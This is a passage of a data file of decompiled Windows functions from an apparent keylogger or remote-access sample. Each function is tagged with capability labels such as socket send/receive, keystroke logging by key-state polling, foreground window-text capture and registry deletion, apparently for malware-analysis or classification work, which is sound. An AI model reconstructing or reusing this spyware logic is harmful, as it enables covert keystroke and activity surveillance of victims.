fcn.00405974();\n            if (uVar1) {\n                fcn.0048adcc();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.0048adcc();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.0048adcc();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.0048adcc();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                uVar1 = 1;\n                fcn.0048adcc();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.00489bb0();\n                fcn.00405864();\n            }\n            goto code_r0x0048573a;\n        }\n    }\n    fcn.00405584();\ncode_r0x0048573a:\n    *in_FS_OFFSET = var_2ch;\n    fcn.00405554(0x48575c);\n    return;\n}\n",
        "token_count": 870
    },
    "00486210": {
        "rules": [
            "contain loop",
            "send data on socket",
            "send data",
            "receive data",
            "receive data on socket"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00486210(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *var_4h;\n    \n    fcn.004030fc();\n    iVar1 = fcn.00466470();\n    var_4h = fcn.00404620();\n    fcn.0041b798(iVar1, iVar1 >> 0x1f);\n    fcn.0041b978();\n    fcn.0041b734(0, 0);\n    do {\n        fcn.00403af4();\n        iVar1 = (**(*var_4h + 0xc))();\n        if (iVar1 == 0) break;\n        var_4h = 0x49a3a0;\n        sub.wsock32.dll_send(*0x49c3a0, 0x49a3a0, iVar1);\n        sub.wsock32.dll_recv(*0x49c3a0, 0x49a3a0, 0x1fff, 0);\n    } while (iVar1 != 0);\n    fcn.00475f68();\n    fcn.0040f944();\n    return;\n}\n",
        "token_count": 275
    },
    "004870d4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __fastcall fcn.004870d4(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    uint *puStack56;\n    uint *puStack52;\n    uint *puStack48;\n    uint *puStack44;\n    int32_t var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 4;\n    do {\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_1ch = 0x4870f5;\n    var_18h = unaff_EDI;\n    var_14h = unaff_ESI;\n    var_10h = unaff_EBX;\n    var_8h = param_2;\n    fcn.004059cc();\n    var_1ch = 0x4870fd;\n    fcn.004059cc();\n    var_20h = 0x4872fc;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004870d4::var_24h;\n    puStack44 = 0x49c3a8;\n    puStack48 = 0x487115;\n    var_1ch = &stack0xfffffffc;\n    sub.kernel32.dll_EnterCriticalSection();\n    puStack52 = 0x4872da;\n    puStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    iVar1 = (**(**0x49c3a4 + 0x14))();\n    if (iVar1 < 1) {\n        fcn.00404f70();\n        *in_FS_OFFSET = puStack56;\n        puStack48 = 0x487303;\n        puStack52 = 0x4872fb;\n        fcn.00405554();\n        return;\n    }\n    iVar1 = (**(**0x49c3a4 + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(**0x49c3a4 + 0xc))();\n            puStack44 = &fcn.004870d4::var_ch;\n            puStack48 = 0x487173;\n            fcn.00405b28();\n            puStack48 = 0x487183;\n            fcn.00405a44();\n            puStack48 = 0x487190;\n            fcn.00405b28();\n            puStack48 = 0x48719f;\n            fcn.00405a84();\n            puStack48 = &fcn.004870d4::var_10h;\n            puStack52 = 0x4871b0;\n            fcn.00405b28();\n            puStack52 = 0x4871c0;\n            fcn.00405a44();\n            puStack52 = 0x4871cd;\n            fcn.00405b28();\n            puStack52 = 0x4871dc;\n            fcn.00405a84();\n            puStack52 = &fcn.004870d4::var_14h;\n            puStack56 = 0x4871ed;\n            fcn.00405b28();\n            puStack56 = 0x4871fd;\n            fcn.00405a44();\n            puStack56 = 0x48720a;\n            fcn.00405b28();\n            puStack56 = 0x487219;\n            fcn.00405a84();\n            puStack56 = &fcn.004870d4::var_18h;\n            iVar2 = fcn.00405b28();\n            uVar3 = iVar2 == 1;\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.004055c8();\n            fcn.00405974();\n            if (uVar3) {\n                fcn.004055c8();\n                fcn.004058e0(var_1ch, 0x487314, var_18h, 0x487314, var_14h, 0x487314, var_10h, 0x487314, var_ch);\n                (**(**0x49c3a4 + 0x20))();\n                break;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = puStack56;\n    puStack48 = 0x4872e1;\n    puStack52 = 0x49c3a8;\n    puStack56 = 0x4872d9;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 1167
    },
    "00487318": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00487318(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    uint *puStack64;\n    uint *puStack60;\n    uchar *puStack56;\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_11h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_ch = 0;\n    puStack40 = 0x487330;\n    fcn.004059cc();\n    uStack44 = 0x487468;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    uStack52 = 0x49c3a8;\n    puStack56 = 0x48734c;\n    puStack40 = &stack0xfffffffc;\n    sub.kernel32.dll_EnterCriticalSection();\n    puStack60 = 0x487446;\n    puStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    iVar1 = (**(**0x49c3a4 + 0x14))();\n    if (iVar1 < 1) {\n        fcn.00404f70();\n        *in_FS_OFFSET = puStack64;\n        puStack56 = 0x48746f;\n        puStack60 = 0x487467;\n        fcn.00405554();\n        return;\n    }\n    iVar1 = (**(**0x49c3a4 + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(**0x49c3a4 + 0xc))();\n            puStack60 = &fcn.00487318::var_8h;\n            puStack64 = 0x4873aa;\n            fcn.00405b28();\n            puStack64 = 0x4873ba;\n            fcn.00405a44();\n            puStack64 = 0x4873c7;\n            fcn.00405b28();\n            puStack64 = 0x4873d6;\n            fcn.00405a84();\n            puStack64 = &fcn.00487318::var_ch;\n            iVar2 = fcn.00405b28();\n            uVar3 = iVar2 == 1;\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.00405974();\n            if (uVar3) break;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = puStack64;\n    puStack56 = 0x48744d;\n    puStack60 = 0x49c3a8;\n    puStack64 = 0x487445;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 677
    },
    "00487488": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00487488(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    uchar uVar4;\n    uint *puStack72;\n    uint *puStack68;\n    uint *puStack64;\n    uint *puStack60;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    puStack48 = 0x4874a2;\n    fcn.004059cc();\n    uStack52 = 0x487671;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack60 = 0x49c3a8;\n    puStack64 = 0x4874ba;\n    puStack48 = &stack0xfffffffc;\n    sub.kernel32.dll_EnterCriticalSection();\n    puStack68 = 0x48764f;\n    puStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    iVar1 = (**(**0x49c3a4 + 0x14))();\n    if (iVar1 < 1) {\n        fcn.00404f70();\n        *in_FS_OFFSET = puStack72;\n        puStack64 = 0x487678;\n        puStack68 = 0x487670;\n        fcn.00405554();\n        return;\n    }\n    iVar1 = (**(**0x49c3a4 + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(**0x49c3a4 + 0xc))();\n            puStack60 = &fcn.00487488::var_8h;\n            puStack64 = 0x487518;\n            fcn.00405b28();\n            puStack64 = 0x487528;\n            fcn.00405a44();\n            puStack64 = 0x487535;\n            fcn.00405b28();\n            puStack64 = 0x487544;\n            fcn.00405a84();\n            puStack64 = &fcn.00487488::var_ch;\n            puStack68 = 0x487555;\n            fcn.00405b28();\n            puStack68 = 0x487565;\n            fcn.00405a44();\n            puStack68 = 0x487572;\n            fcn.00405b28();\n            puStack68 = 0x487581;\n            fcn.00405a84();\n            puStack68 = &fcn.00487488::var_10h;\n            puStack72 = 0x487592;\n            fcn.00405b28();\n            puStack72 = 0x4875a2;\n            fcn.00405a44();\n            puStack72 = 0x4875af;\n            fcn.00405b28();\n            puStack72 = 0x4875be;\n            fcn.00405a84();\n            puStack72 = &fcn.00487488::var_14h;\n            iVar2 = fcn.00405b28();\n            uVar4 = iVar2 == 1;\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.004055c8();\n            fcn.00405974();\n            if (uVar4) {\n                uVar3 = fcn.00409edc();\n                sub.wsock32.dll_closesocket(uVar3);\n                (**(**0x49c3a4 + 0x48))();\n                break;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = puStack72;\n    puStack64 = 0x487656;\n    puStack68 = 0x49c3a8;\n    puStack72 = 0x48764e;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 973
    },
    "0048768c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0048768c(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint *puStack72;\n    uint *puStack68;\n    uint *puStack64;\n    uint *puStack60;\n    uint uStack56;\n    uchar *puStack52;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    uStack56 = 0x487887;\n    puStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack64 = 0x49c3a8;\n    puStack68 = 0x4876b4;\n    sub.kernel32.dll_EnterCriticalSection();\n    puStack72 = 0x487865;\n    puStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    uStack80 = 0x4876cc;\n    puStack68 = &stack0xfffffffc;\n    iVar1 = (**(**0x49c3a4 + 0x14))();\n    if (0 < iVar1) {\n        uStack80 = 0x4876e4;\n        var_20h = (**(**0x49c3a4 + 0x14))();\n        if (-1 < var_20h + -1) {\n            do {\n                uStack80 = 0x487708;\n                (**(**0x49c3a4 + 0xc))();\n                puStack60 = &fcn.0048768c::var_4h;\n                puStack64 = 0x487719;\n                fcn.00405b28();\n                puStack64 = 0x487729;\n                fcn.00405a44();\n                puStack64 = 0x487736;\n                fcn.00405b28();\n                puStack64 = 0x487745;\n                fcn.00405a84();\n                puStack64 = &fcn.0048768c::var_8h;\n                puStack68 = 0x487756;\n                fcn.00405b28();\n                puStack68 = 0x487766;\n                fcn.00405a44();\n                puStack68 = 0x487773;\n                fcn.00405b28();\n                puStack68 = 0x487782;\n                fcn.00405a84();\n                puStack68 = &fcn.0048768c::var_ch;\n                puStack72 = 0x487793;\n                fcn.00405b28();\n                puStack72 = 0x4877a3;\n                fcn.00405a44();\n                puStack72 = 0x4877b0;\n                fcn.00405b28();\n                puStack72 = 0x4877bf;\n                fcn.00405a84();\n                puStack72 = &fcn.0048768c::var_10h;\n                puStack76 = 0x4877d0;\n                fcn.00405b28();\n                puStack76 = 0x4877e0;\n                fcn.00405a44();\n                puStack76 = 0x4877ed;\n                fcn.00405b28();\n                puStack76 = 0x4877fc;\n                fcn.00405a84();\n                puStack76 = 0x487807;\n                fcn.004055c8();\n                uStack80 = 0x48782d;\n                iStack84 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffac;\n                puStack76 = &stack0xfffffffc;\n                iVar1 = fcn.00409edc();\n                sub.wsock32.dll_closesocket();\n                *in_FS_OFFSET = iVar1;\n                var_20h = var_20h + -1;\n            } while (var_20h != 0);\n        }\n        uStack80 = 0x48784d;\n        (**(**0x49c3a4 + 0x44))();\n        *in_FS_OFFSET = puStack76;\n        puStack68 = 0x48786c;\n        puStack72 = 0x49c3a8;\n        puStack76 = 0x487864;\n        sub.kernel32.dll_LeaveCriticalSection();\n        return;\n    }\n    uStack80 = 0x4876d5;\n    fcn.00404f70();\n    *in_FS_OFFSET = puStack76;\n    puStack68 = 0x48788e;\n    puStack72 = 0x487886;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1108
    },
    "0048997c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0048997c(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4899fb;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.004033b8();\n    fcn.00405530();\n    if (0 < in_EAX) {\n        do {\n            fcn.004033e0();\n            fcn.00405718();\n            fcn.00405818();\n            fcn.00405584();\n            in_EAX = in_EAX + -1;\n        } while (in_EAX != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x489a02;\n    uStack32 = 0x4899fa;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 240
    },
    "0048a480": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.0048a480(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 5;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_20h = 0x48a614;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0048a480::var_24h;\n    var_18h = unaff_EDI;\n    var_14h = unaff_ESI;\n    fcn.00405530();\n    piVar1 = fcn.004216c4();\n    piVar2 = fcn.00404620();\n    fcn.004217a0();\n    fcn.004218e4();\n    fcn.00421dd8();\n    iVar3 = (**(*piVar2 + 0x14))();\n    if (-1 < iVar3 + -1) {\n        var_20h = 0;\n        var_24h = iVar3;\n        do {\n            (**(*piVar2 + 0xc))();\n            fcn.00405864();\n            fcn.004218e4();\n            fcn.00422068();\n            fcn.00422068();\n            fcn.00422068();\n            fcn.00422068();\n            fcn.00422068();\n            (**(*piVar2 + 0xc))(*var_1ch);\n            var_4h = 0x48a71c;\n            var_8h = var_ch;\n            var_ch = 0x48a71c;\n            var_14h = 0x48a71c;\n            var_18h = 0x48a71c;\n            var_1ch = 0x48a71c;\n            var_20h = 0x48a71c;\n            var_24h = 0x48a728;\n            fcn.004058e0();\n            var_20h = var_20h + 1;\n            var_24h = var_24h + -1;\n        } while (var_24h != 0);\n    }\n    fcn.00404650();\n    fcn.00421770();\n    (**(*piVar1 + -4))();\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x48a61b;\n    var_20h = 0x48a606;\n    fcn.00405554();\n    var_20h = 0x48a613;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 773
    },
    "0040a1c4": {
        "rules": [
            "read file on Windows"
        ],
        "decompiled_code": "\nulong fcn.0040a1c4(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uStack36;\n    \n    iVar1 = sub.kernel32.dll_ReadFile_1();\n    uStack36 = in_EAX;\n    if (iVar1 == 0) {\n        uStack36 = 0xffffffff;\n    }\n    return CONCAT44(uStack36, uStack36);\n}\n",
        "token_count": 90
    },
    "00421f68": {
        "rules": [
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00421f68(uchar *param_1)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t unaff_EBX;\n    uint uVar4;\n    uchar *puStack20;\n    \n    puStack20 = param_1;\n    fcn.00403af4();\n    uVar2 = fcn.004059dc(0, &puStack20, 0, param_1 + 4);\n    uVar4 = *(in_EAX + 4);\n    iVar3 = sub.advapi32.dll_RegQueryValueExA_1(uVar4, uVar2);\n    uVar1 = fcn.0042169c();\n    *param_1 = uVar1;\n    return CONCAT44(uVar4, unaff_EBX & 0xffffff00 | iVar3 == 0);\n}\n",
        "token_count": 201
    },
    "0040a1f0": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\nulong fcn.0040a1f0(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uStack36;\n    \n    iVar1 = sub.kernel32.dll_WriteFile_1();\n    uStack36 = in_EAX;\n    if (iVar1 == 0) {\n        uStack36 = 0xffffffff;\n    }\n    return CONCAT44(uStack36, uStack36);\n}\n",
        "token_count": 90
    },
    "0042c22c": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\nvoid fcn.0042c22c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x42c2a0);\n    if (iVar1 != 0) {\n        *0x491e9c = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42c2ac);\n        *0x491ea0 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42c2c0);\n        *0x491ea4 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42c2d0);\n        *0x491ea8 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42c2e8);\n        *0x491eac = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42c300);\n        *0x491eb0 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x42c318);\n    }\n    return;\n}\n",
        "token_count": 230
    },
    "00431cf4": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\nvoid fcn.00431cf4(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x431e58);\n    if (iVar1 != 0) {\n        *0x499bf8 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431e68);\n        *0x499bfc = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431e7c);\n        *0x499bf0 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431e90);\n        *0x499bf4 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431ea8);\n        *0x499bcc = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431ec0);\n        if (*0x499bcc == 0) {\n            *0x499bcc = 0x408080;\n        }\n        *0x499bd0 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431ed8);\n        if (*0x499bd0 == 0) {\n            *0x499bd0 = 0x4084e8;\n        }\n        *0x499bd4 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431ef0);\n        if (*0x499bd4 == 0) {\n            *0x499bd4 = 0x408210;\n        }\n        *0x499bd8 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431f08);\n        if (*0x499bd8 == 0) {\n            *0x499bd8 = 0x408200;\n        }\n        *0x499bdc = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431f20);\n        if (*0x499bdc == 0) {\n            *0x499bdc = 0x408208;\n        }\n        *0x499be0 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431f34);\n        if (*0x499be0 == 0) {\n            *0x499be0 = 0x408498;\n        }\n        *0x499be4 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431f48);\n        if (*0x499be4 == 0) {\n            *0x499be4 = 0x408490;\n        }\n        *0x499be8 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x431f60);\n        if (*0x499be8 == 0) {\n            *0x499be8 = 0x4084a0;\n        }\n    }\n    return;\n}\n",
        "token_count": 615
    },
    "00447d54": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00447d54(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x447d78);\n    if (iVar1 != 0) {\n        *0x492504 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x447d84);\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "0040d380": {
        "rules": [
            "get geographical location"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040d380(uint32_t param_1)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetLocaleInfoA_1();\n    if (0 < iVar1) {\n        param_1 = in_EAX & 0xff;\n    }\n    return CONCAT44(in_EAX, param_1);\n}\n",
        "token_count": 87
    },
    "00407688": {
        "rules": [
            "get thread local storage value"
        ],
        "decompiled_code": "\nint32_t fcn.00407688(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    \n    if (*0x4977f4 == '\\0') {\n        return *(*(in_FS_OFFSET + 0x2c) + *0x4917b8 * 4);\n    }\n    iVar1 = sub.kernel32.dll_TlsGetValue(*0x4917b8);\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    fcn.00407644();\n    iVar1 = sub.kernel32.dll_TlsGetValue(*0x4917b8);\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    return *0x4977fc;\n}\n",
        "token_count": 161
    },
    "0041c2d4": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c2d4(uint noname_0, uint lpType)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint lpName;\n    \n    iVar1 = sub.kernel32.dll_FindResourceA();\n    *(in_EAX + 0x10) = iVar1;\n    if (iVar1 == 0) {\n        fcn.0041c234(&stack0xfffffffc);\n    }\n    iVar1 = sub.kernel32.dll_LoadResource();\n    *(in_EAX + 0x14) = iVar1;\n    if (iVar1 == 0) {\n        fcn.0041c234(&stack0xfffffffc);\n    }\n    uVar2 = sub.kernel32.dll_SizeofResource();\n    sub.kernel32.dll_LockResource(*(in_EAX + 0x14), uVar2);\n    fcn.0041bdb4();\n    return;\n}\n",
        "token_count": 204
    },
    "00421d50": {
        "rules": [
            "delete registry value"
        ],
        "decompiled_code": "\nuint32_t fcn.00421d50(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = fcn.004059dc();\n    uVar2 = sub.advapi32.dll_RegDeleteValueA(*(in_EAX + 4), uVar1);\n    return uVar2 & 0xffffff00 | uVar2 == 0;\n}\n",
        "token_count": 94
    },
    "004818e0": {
        "rules": [
            "log keystrokes"
        ],
        "decompiled_code": "\nuint fcn.004818e0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.user32.dll_MapVirtualKeyA();\n    if (iVar1 == 0x1a) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 59
    },
    "00437d60": {
        "rules": [
            "log keystrokes via polling",
            "get keyboard layout"
        ],
        "decompiled_code": "\nuchar fcn.00437d60(void)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    \n    iVar1 = sub.user32.dll_GetKeyState(0xa5);\n    uVar3 = 0;\n    if ((iVar1 < 0) && (iVar2 = sub.user32.dll_GetKeyboardLayout(0),  uVar3 = *0x4924ec,  iVar2 != *0x4924e8)) {\n        fcn.00437bbc();\n        *0x4924e8 = iVar2;\n        uVar3 = *0x4924ec;\n    }\n    return uVar3;\n}\n",
        "token_count": 147
    },
    "0043bc50": {
        "rules": [
            "log keystrokes via polling"
        ],
        "decompiled_code": "\nuint8_t fcn.0043bc50(void)\n\n{\n    int16_t iVar1;\n    uint32_t in_EAX;\n    uint8_t uVar2;\n    \n    uVar2 = *0x43bc8c;\n    iVar1 = sub.user32.dll_GetKeyState(0x10);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 1;\n    }\n    iVar1 = sub.user32.dll_GetKeyState(0x11);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 4;\n    }\n    if ((in_EAX & 0x20000000) != 0) {\n        uVar2 = uVar2 | 2;\n    }\n    return uVar2;\n}\n",
        "token_count": 171
    },
    "0046f390": {
        "rules": [
            "enumerate gui resources"
        ],
        "decompiled_code": "\nvoid fcn.0046f390(void)\n\n{\n    fcn.00405530();\n    sub.user32.dll_EnumWindows(fcn.0046f17c, 0);\n    fcn.00405584();\n    return;\n}\n",
        "token_count": 52
    },
    "0046f5bc": {
        "rules": [
            "enumerate gui resources"
        ],
        "decompiled_code": "\nvoid fcn.0046f5bc(void)\n\n{\n    fcn.00405530();\n    sub.user32.dll_EnumWindows(fcn.0046f3b8, 0);\n    fcn.00405584();\n    return;\n}\n",
        "token_count": 54
    },
    "0046f6e0": {
        "rules": [
            "enumerate gui resources"
        ],
        "decompiled_code": "\nvoid fcn.0046f6e0(void)\n\n{\n    fcn.00405530();\n    sub.user32.dll_EnumWindows(fcn.0046f5e4, 0);\n    fcn.00405584();\n    return;\n}\n",
        "token_count": 55
    },
    "00480f70": {
        "rules": [
            "get graphical window text"
        ],
        "decompiled_code": "\nvoid fcn.00480f70(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd0;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x480fdd;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405530();\n    iVar1 = sub.user32.dll_GetForegroundWindow();\n    if (iVar1 != 0) {\n        iVar2 = sub.user32.dll_GetWindowTextLengthA(iVar1);\n        fcn.00405c6c();\n        uVar3 = fcn.004059dc(iVar2 + 1);\n        sub.user32.dll_GetWindowTextA(iVar1, uVar3);\n        fcn.00409c20();\n        in_stack_ffffffd0 = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.00405530(0x480fe4);\n    return;\n}\n",
        "token_count": 268
    },
    "0048cf38": {
        "rules": [
            "get graphical window text"
        ],
        "decompiled_code": "\nvoid fcn.0048cf38(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd0;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x48cfa5;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405530();\n    iVar1 = sub.user32.dll_GetForegroundWindow();\n    if (iVar1 != 0) {\n        iVar2 = sub.user32.dll_GetWindowTextLengthA(iVar1);\n        fcn.00405c6c();\n        uVar3 = fcn.004059dc(iVar2 + 1);\n        sub.user32.dll_GetWindowTextA(iVar1, uVar3);\n        fcn.00409c20();\n        in_stack_ffffffd0 = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.00405530(0x48cfac);\n    return;\n}\n",
        "token_count": 269
    },
    "0048dff0": {
        "rules": [
            "get graphical window text"
        ],
